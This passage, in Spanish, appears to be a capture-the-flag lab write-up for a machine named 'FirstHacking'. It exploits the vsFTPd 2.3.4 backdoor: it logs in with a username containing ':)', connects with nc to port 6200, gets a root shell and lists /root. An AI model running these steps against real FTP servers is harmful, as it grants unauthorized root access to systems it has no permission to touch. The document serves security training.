// 04

Explotación del backdoor de vsFTPd 2.3.4

Se aprovecha la vulnerabilidad del backdoor malicioso insertado en vsFTPd 2.3.4: al autenticarse con un usuario que contenga la secuencia :) en el nombre, el servicio abre una shell en el puerto 6200.

BASH
$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): AbogadoCibernetico:)
331 Please specify the password.
Password:

// 05

Conexión a la shell del backdoor y escalada a root

BASH
$ nc 172.17.0.2 6200
(UNKNOWN) [172.17.0.2] 6200 (?) : Connection refused

Tras un par de reintentos, la conexión se establece correctamente:

BASH
$ nc 172.17.0.2 6200
BASH
$ whoami
root
BASH
$ cd /root
$ ls -la
total 20
drwx------ 1 root root 4096 May 5 2024 .
drwxr-xr-x 1 root root 4096 Oct 3 23:27 ..
-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc
-rw-r--r-- 1 root root 161 Dec 5 2019 .profile
drwxr-xr-x 1 root root 4096 May 5 2024 vsftpd-2.3.4

Resultado: acceso directo como root sin necesidad de escalada de privilegios adicional, gracias al backdoor del servicio FTP.

// 06

Resumen y conclusión

Resumen: la máquina *FirstHacking* explota la vulnerabilidad del backdoor de vsFTPd 2.3.4 (CVE histórico asociado a la versión troyanizada del código fuente). El vector de ataque consiste en:

1. Escanear puertos y detectar el servicio y versión vulnerables. 2. Conectarse por FTP usando un nombre de usuario que contenga :). 3. Conectarse al puerto 6200, donde el backdoor expone una shell con privilegios de root.
